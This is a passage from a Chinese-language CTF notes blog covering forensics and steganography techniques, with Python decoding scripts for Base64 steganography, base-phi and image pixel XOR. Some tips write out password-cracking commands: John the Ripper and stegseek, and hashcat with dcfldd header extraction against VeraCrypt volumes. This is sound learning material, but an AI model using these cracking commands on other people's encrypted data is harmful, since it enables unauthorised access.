<li>TLS的握手报文会传输hostname信息（<a target="_blank" rel="noopener" href="https://www.cloudflare.com/zh-cn/learning/ssl/what-is-sni/">SNI</a>），可用<code>tls.handshake.extensions_server_name</code>过滤。</li>
<li>获取TLS密钥后，可用<code>tls and (http or http2)</code>过滤出解密后的报文。</li>
<li>AES-256的密钥长度为32字节。</li>
</ul>
<ol start="104">
<li>git命令更改config，使用制定用户的身份推送远程库。例题:<a href="../../CTF/LA%20CTF/Misc/new-challenge.md">new-challenge</a></li>
<li>MSB（most signficant bit）隐写。将信息藏在RGB颜色分量二进制值的最高位。与<a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-PNG%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84LSB%E9%9A%90%E5%86%99">LSB</a>不同的是，这种隐写会使图片颜色失真（损坏）。例题:<a target="_blank" rel="noopener" href="https://ctftime.org/writeup/16174">msb</a>，里面有图片颜色失真的例子。可在<a target="_blank" rel="noopener" href="https://stegonline.georgeom.net/extract">stegonline</a>提取。选项设置如下：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">R:7</span><br><span class="line">G:7</span><br><span class="line">B:7</span><br><span class="line">Pixel Order:Row</span><br><span class="line">Bit Order:MSB</span><br><span class="line">Bit Plane Order:RGB</span><br><span class="line">Trim Trailing Bits:No</span><br></pre></td></tr></table></figure>

<ol start="106">
<li>linux 使用mount挂载img镜像。</li>
</ol>
<ul>
<li><a target="_blank" rel="noopener" href="https://zhou-yuxin.github.io/articles/2015/Linux%E6%8C%82%E8%BD%BDimg%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F%E6%96%87%E4%BB%B6/index.html">Linux挂载img磁盘镜像文件</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_3823536/2501563">Linux如何挂载img镜像</a></li>
</ul>
<p>偏移可用<code>binwalk xxx.img</code>(或者<code>fdisk -l disk.img</code>)获得。挂载镜像后，输入<code>sudo su</code>来获取root权限。分析镜像时，<code>tree</code>命令可帮助查看目录的结构。挂载镜像后,<code>.ash_history</code>文件将不会存储原本镜像的命令，而是挂载者在镜像里输入的命令。因此挂载是无法获取命令历史的。</p>
<ol start="107">
<li><a target="_blank" rel="noopener" href="https://github.com/Dhanush-T/PCTF23-writeups/blob/main/Forensics/Nuclearophine/writeup.md">Nuclearophine</a></li>
</ol>
<ul>
<li>使用python Scapy库提取udp包数据</li>
<li>WAV文件修复。WAV文件的第37-40个字节应为data。</li>
<li>stegolsb提取WAV文件内容。</li>
<li><a target="_blank" rel="noopener" href="https://rfmw.em.keysight.com/rfcomms/refdocs/cdma2k/cdma2000_meas_dtmf_desc.html">DTMF tones</a>分析。</li>
</ul>
<ol start="108">
<li>audacity可以分析一段特定音频的频率情况。在audacity里选中一个范围的音频后，去Analyze –&gt; Plot Spectrum即可查看该段音频的频率情况。例题:<a target="_blank" rel="noopener" href="https://github.com/jdabtieu/wxmctf-2023-public/blob/main/foren2/writeup.md">Sneaky Spying</a></li>
<li><a target="_blank" rel="noopener" href="https://wiki.osdev.org/USB_Human_Interface_Devices">usb mouse</a>&#x2F;usb鼠标流量包(如Microsoft Paint)分析。可直接用<a target="_blank" rel="noopener" href="https://github.com/WangYihang/UsbMiceDataHacker/tree/master">脚本</a>提取数据并matplotlib.pyplot绘制数据。例题:<a target="_blank" rel="noopener" href="https://github.com/jdabtieu/wxmctf-2023-public/blob/main/foren4/writeup.md">Paint</a></li>
<li>一张png的文件结构包含下列字符串：<code>PNG</code>,<code>IHDR</code>,<code>sRGB</code>,<code>pHYs</code>,<code>IDAT</code>。只有第一个，第二个和第五个损坏会导致图片无法打开。</li>
<li><a target="_blank" rel="noopener" href="https://github.com/jdabtieu/wxmctf-2023-public/blob/main/misc2/writeup.md">Broken Telephone</a></li>
</ol>
<ul>
<li>根据svg图片数据写入svg图片文件</li>
<li>svg图片文件头+<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/svg/svg_path.asp"><path></a>标签的数据特征（hex颜色格式+路径数据MCZ等）。</li>
</ul>
<ol start="112">
<li><a target="_blank" rel="noopener" href="https://github.com/jrspruitt/ubi_reader">UBI Reader</a>可用于提取UBIfs镜像数据内的文件。</li>
<li>终端的whois命令不仅可以查询domain，还可以查询ip地址。</li>
<li><a target="_blank" rel="noopener" href="https://workmanlayout.org/">workman</a>等键盘布局（layout）相互转换<a target="_blank" rel="noopener" href="https://awsm-tools.com/keyboard-layout">网站</a>。</li>
<li><a target="_blank" rel="noopener" href="https://github.com/BlackAnon22/BlackAnon22.github.io/blob/main/posts/CTF%20Competitions/picoCTF_2023.md#unforgottenbits-500-points">UnforgottenBits</a></li>
</ol>
<ul>
<li>linux img镜像分析。</li>
<li>使用mount命令挂载镜像，autospy(ui版tsk)获取被删除的邮件。因为邮件一定有“subject”，于是在“keyword search”处搜索subject，即可看到文件。</li>
<li><a target="_blank" rel="noopener" href="https://www.wikiwand.com/en/Golden_ratio_base">golden ratio base</a>解码脚本。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the Base-Phi constant</span></span><br><span class="line">PHI = (<span class="number">1</span> + math.sqrt(<span class="number">5</span>)) / <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define a function to perform Base-Phi decoding</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base_phi_decode</span>(<span class="params">encoded_string</span>):</span><br><span class="line">    <span class="comment"># Split the encoded string into segments separated by periods</span></span><br><span class="line">    segments = encoded_string.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Initialize the result string</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Iterate over each segment</span></span><br><span class="line">    <span class="keyword">for</span> segment <span class="keyword">in</span> segments:</span><br><span class="line">        <span class="comment"># Initialize the decoded value for this segment to 0</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(segment))</span><br><span class="line">        value = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Iterate over each character in the segment</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(segment)):</span><br><span class="line">            <span class="comment"># If the character is &#x27;1&#x27;, add PHI to the decoded value</span></span><br><span class="line">            <span class="keyword">if</span> segment[i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                value += PHI**(<span class="built_in">len</span>(segment) - i - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Append the decoded character to the result string</span></span><br><span class="line">        result += <span class="built_in">str</span>(<span class="built_in">int</span>(value))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Return the result string</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># Test the function with the given encoded string</span></span><br><span class="line">encoded_string = <span class="string">&quot;01010010100.01001001000100.01001010000100&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">eeee = encoded_string.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">out = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(eeee)-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> i ==<span class="number">0</span>:</span><br><span class="line">        out.append(eeee[i]+<span class="string">&#x27;.&#x27;</span>+eeee[i+<span class="number">1</span>][:<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        out.append(eeee[i][<span class="number">3</span>:]+<span class="string">&#x27;.&#x27;</span>+eeee[i+<span class="number">1</span>][:<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(out)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># decoded_string = base_phi_decode(encoded_string)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(decoded_string)</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> out:</span><br><span class="line"></span><br><span class="line">    integer_part, fractional_part = p.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Convert the integer part to decimal</span></span><br><span class="line">    decimal_value = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(integer_part)):</span><br><span class="line">        decimal_value += <span class="built_in">int</span>(integer_part[i]) * (PHI ** (<span class="built_in">len</span>(integer_part) - i - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Convert the fractional part to decimal</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(fractional_part) &gt; <span class="number">0</span>:</span><br><span class="line">        fractional_value = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fractional_part)):</span><br><span class="line">            fractional_value += <span class="built_in">int</span>(fractional_part[i]) * (<span class="number">2</span> ** -(i + <span class="number">1</span>))</span><br><span class="line">        decimal_value += fractional_value</span><br><span class="line"></span><br><span class="line">    key += <span class="built_in">chr</span>(<span class="built_in">round</span>(decimal_value))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(out))</span><br></pre></td></tr></table></figure>

<ul>
<li>openssl解密aes密文。<code>openssl enc -aes-256-cbc -d -in flag.enc -out res -salt -iv xxx -K xxx</code></li>
</ul>
<ol start="116">
<li>盲水印。分两种，一种会给两张一样的图，另一种只给一张图。例题:<a target="_blank" rel="noopener" href="https://ctf-show.feishu.cn/docx/UpC6dtDqgo7VuoxXlcvcLwzKnqh#Es84dUM2CoIAI4xGI8Ac6ugvncc">flag一分为二</a></li>
<li>010Editor菜单栏-&gt;工具-&gt;比较文件可以找到两个文件的不同点。另外，工具栏里还有很多其他工具，都可以试试。</li>
<li><a target="_blank" rel="noopener" href="https://merricx.github.io/qrazybox/">QRazyBox</a>可以扫描一些其他工具扫描不出来的内容。有的时候，将纠错区涂白还能看见额外内容。例题:<a target="_blank" rel="noopener" href="https://ctf-show.feishu.cn/docx/UpC6dtDqgo7VuoxXlcvcLwzKnqh#ZaIsdcqYOoIEmExxqMEcVopaniv">迅疾响应</a></li>
<li><a target="_blank" rel="noopener" href="http://www.bertnase.de/npiet/npiet-execute.php">npiet</a>图片编程语言。程序大概长这样：</li>
</ol>
<p><img src="C:/Users/a1348/Desktop/NoobCTF-main/笔记/images/npiet.png" alt="npiet"></p>
<ol start="120">
<li><a target="_blank" rel="noopener" href="https://www.qsl.net/on6mu/rxsstv.htm">RX-SSTV</a>。sstv音频解密工具。</li>
<li><a target="_blank" rel="noopener" href="https://github.com/daffainfo/ctf-writeup/tree/main/GREP%20CTF%202023/Royal%20Steg">Royal Steg</a></li>
</ol>
<ul>
<li>使用John the Ripper（zip2john+john）<a target="_blank" rel="noopener" href="https://secnhack.in/crack-zip-files-password-using-john-the-ripper/">爆破</a>加密zip密码。</li>
<li>stegseek爆破steghide密码。</li>
</ul>
<ol start="122">
<li><a target="_blank" rel="noopener" href="https://github.com/CybercellVIIT/VishwaCTF-23_Official_Writeups/blob/main/Digital%20Forensics/DigitalForensics_CrackingTheBadVault.pdf">CrackingTheBadVault</a></li>
</ol>
<ul>
<li>dcfldd命令从veracrypt partition volume header中提取hashcat爆破所需的hash。一般在第一个sector，通常一个sector 512字节。<code>sudo dcfldd if=image.img of=header.tc bs=1 count=512</code></li>
<li>hashcat爆破Veracrypt+sha512：<code>sudo hashcat -a 3 -m 13721 &lt;hash-path&gt; &lt;word-list&gt;</code>。爆破内部隐藏partition密码（已知pim或者大致爆破范围和keyfiles）：<code>sudo hashcat -a 3 -m 13721 --veracrypt-keyfiles=key.png --veracrypt-pim-start=900 --veracrypt-pim-start=901 hidden-vol.tc &lt;word-list&gt;</code>，<code>hashcat --force --status --hash-type=13721 --veracrypt-pim-start=start --veracrypt-pim-stop=end -S -w 3 --workload-profile=&quot;2&quot; vol rockyou.txt</code></li>
<li>可在veracrypt volume中隐藏partition。提取隐藏partition的volume header的命令:<code>sudo dcfldd if=image.img of=hidden-vol.tc bs=1 skip=65536 count=512</code></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/09/01/%E9%9A%90%E5%86%99%E7%B3%BB%E5%88%97/" data-id="cm0kx5k5k001vo8dk6qftf75y" data-title="隐写系列" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-脚本工具" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/09/01/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/" class="article-date">
  <time class="dt-published" datetime="2024-09-01T13:39:36.000Z" itemprop="datePublished">2024-09-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/09/01/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/">脚本工具</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>首先我个脚本小子不可能写得出来，都是抄的和chatgpt大哥写的，（ε&#x3D;(´ο｀*)))唉，看不见的大手发力了！！！！！！！</p>
<p>为了避嫌我把原地找到了，不要来抓我，退一万步讲，，，，，哎！？你也听不到</p>
<p>有时候一个知道的知识点却不记得解题脚本放哪个wp里了，又懒得再写一遍。那就专门开个地方存起来。分类就不分了，有些脚本多个分区都能用。</p>
<h2 id="Base64隐写"><a href="#Base64隐写" class="headerlink" title="Base64隐写"></a>Base64隐写</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/349481870">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Base64Stego_Decrypt</span>(<span class="params">LineList</span>):</span><br><span class="line">    Base64Char = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>     <span class="comment">#Base64字符集 已按照规范排列</span></span><br><span class="line">    BinaryText = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> LineList:</span><br><span class="line">        <span class="keyword">if</span> line.find(<span class="string">&quot;==&quot;</span>) &gt; <span class="number">0</span>:     <span class="comment">#如果文本中有2个=符号</span></span><br><span class="line">            temp = <span class="built_in">bin</span>(Base64Char.find(line[-<span class="number">3</span>]) &amp; <span class="number">15</span>)[<span class="number">2</span>:]      <span class="comment">#通过按位与&amp;15运算取出二进制数后4位 [2:]的作用是将0b过滤掉</span></span><br><span class="line">            BinaryText = BinaryText+<span class="string">&quot;0&quot;</span>*(<span class="number">4</span>-<span class="built_in">len</span>(temp))+temp      <span class="comment">#高位补0</span></span><br><span class="line">        <span class="keyword">elif</span> line.find(<span class="string">&quot;=&quot;</span>) &gt; <span class="number">0</span>:        <span class="comment">#如果文本中有1个=符号</span></span><br><span class="line">            temp = <span class="built_in">bin</span>(Base64Char.find(line[-<span class="number">2</span>]) &amp; <span class="number">3</span>)[<span class="number">2</span>:]       <span class="comment">#通过按位与&amp;3运算取出二进制数后2位</span></span><br><span class="line">            BinaryText = BinaryText+<span class="string">&quot;0&quot;</span>*(<span class="number">2</span>-<span class="built_in">len</span>(temp))+temp      <span class="comment">#高位补0</span></span><br><span class="line">    Text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(BinaryText) % <span class="number">8</span> != <span class="number">0</span>):       <span class="comment">#最终得到的隐写数据二进制位数不一定都是8的倍数，为了避免数组越界，加上一个判断</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;警告:二进制文本位数有误，将进行不完整解析。&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(BinaryText), <span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span>(i+<span class="number">8</span> &gt; <span class="built_in">len</span>(BinaryText)):</span><br><span class="line">                Text = Text+<span class="string">&quot;-&quot;</span>+BinaryText[i:]</span><br><span class="line">                <span class="keyword">return</span> Text</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Text = Text+<span class="built_in">chr</span>(<span class="built_in">int</span>(BinaryText[i:i+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(BinaryText), <span class="number">8</span>):</span><br><span class="line">            Text = Text+<span class="built_in">chr</span>(<span class="built_in">int</span>(BinaryText[i:i+<span class="number">8</span>], <span class="number">2</span>))      <span class="comment">#将得到的二进制数每8位一组对照ASCII码转化字符</span></span><br><span class="line">        <span class="keyword">return</span> Text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Base64_ForString_Decrypt</span>(<span class="params">Text</span>):     <span class="comment">#Base64解密</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        DecryptedText = <span class="built_in">str</span>(Text).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        DecryptedText = base64.b64decode(DecryptedText)</span><br><span class="line">        DecryptedText = DecryptedText.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> DecryptedText</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Course = <span class="built_in">input</span>(<span class="string">&quot;文件名:&quot;</span>)</span><br><span class="line">    File = <span class="built_in">open</span>(Course, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    LineList = File.read().splitlines()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;显式内容为:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> LineList:</span><br><span class="line">        <span class="built_in">print</span>(Base64_ForString_Decrypt(line),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n隐写内容为:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(Base64Stego_Decrypt(LineList))</span><br></pre></td></tr></table></figure>

<h2 id="Clemency"><a href="#Clemency" class="headerlink" title="Clemency"></a>Clemency</h2><p>Clemency是在DEFCON CTF中由LegitBS发明的架构（好家伙出个题直接创造了一个架构）。原生ida不支持此架构，下方链接提供了大佬的插件脚本。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/cseagle/ida_clemency">地址</a></p>
<h2 id="提取图片内像素"><a href="#提取图片内像素" class="headerlink" title="提取图片内像素"></a>提取图片内像素</h2><p>提取图片透明度值异或。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">m1 = m2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 取大图二进制</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, img.size[<span class="number">0</span>], <span class="number">19</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, img.size[<span class="number">1</span>], <span class="number">19</span>):</span><br><span class="line">        r,g,b,a = img.getpixel((x,y))</span><br><span class="line">        m1 += <span class="built_in">str</span>(r &amp; <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 取中间隐写图二进制</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">171</span>, <span class="number">171</span> + <span class="number">19</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">171</span>, <span class="number">171</span> + <span class="number">19</span>):</span><br><span class="line">        r,g,b,a = img.getpixel((x,y))</span><br><span class="line">        m2 += <span class="built_in">str</span>(a &amp; <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 二进制串取异或</span></span><br><span class="line">xor = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(<span class="built_in">int</span>(A)^<span class="built_in">int</span>(B)) <span class="keyword">for</span> A,B <span class="keyword">in</span> <span class="built_in">zip</span>(m1,m2))</span><br><span class="line"><span class="comment"># 二进制转字符串并输出</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(xor[i:i+<span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(xor), <span class="number">8</span>)))</span><br></pre></td></tr></table></figure>

<p>异或两张图片的完整rgb值，并用结果rgb值写另一张图片。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">image1 = Image.<span class="built_in">open</span>(<span class="string">&#x27;n1.png&#x27;</span>)</span><br><span class="line">image2 = Image.<span class="built_in">open</span>(<span class="string">&#x27;n2.png&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(image1.mode, image2.mode)</span><br><span class="line">size = width, height = image1.size</span><br><span class="line">new = Image.new(<span class="string">&#x27;RGBA&#x27;</span>, size)</span><br><span class="line">img1 = image1.load()</span><br><span class="line">img2 = image2.load()</span><br><span class="line">data = new.load()</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        one = img1[x,y]</span><br><span class="line">        two = img2[x,y]</span><br><span class="line">        new_color = (one[<span class="number">0</span>] ^ two[<span class="number">0</span>],one[<span class="number">1</span>] ^ two[<span class="number">1</span>],one[<span class="number">2</span>] ^ two[<span class="number">2</span>])</span><br><span class="line">        data[x,y]=new_color</span><br><span class="line">new.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>图片像素值(rgb)本身就是字节：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;ctf.png&quot;</span>)</span><br><span class="line">pixels = img.load()</span><br><span class="line">msg = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(img.size[<span class="number">1</span>]):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.size[<span class="number">0</span>]):</span><br><span class="line">        msg += <span class="built_in">bytes</span>(pixels[x, y])</span><br><span class="line"><span class="built_in">print</span>(msg.decode())</span><br></pre></td></tr></table></figure>

<h2 id="词频统计"><a href="#词频统计" class="headerlink" title="词频统计"></a>词频统计</h2><p>统计单词出现的次数就比较麻烦，需要自己构建字典。比如这道题：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Konmu/p/12527029.html">浪里淘沙</a>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;ctf.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data=f.read()</span><br><span class="line">f.close()</span><br><span class="line">statistics=&#123;&#125;</span><br><span class="line">frequency=[]</span><br><span class="line">num=[<span class="number">4</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">16</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zipin</span>(<span class="params">lsit</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lsit:</span><br><span class="line">        statistics.setdefault(data.count(i),<span class="built_in">str</span>(i))</span><br><span class="line">        frequency.append(data.count(i))</span><br><span class="line">    frequency.sort()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(statistics.get(frequency[i-<span class="number">1</span>])),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span>(statistics)</span><br><span class="line"></span><br><span class="line">letters=[]</span><br><span class="line"><span class="built_in">print</span>(zipin(letters))</span><br></pre></td></tr></table></figure>

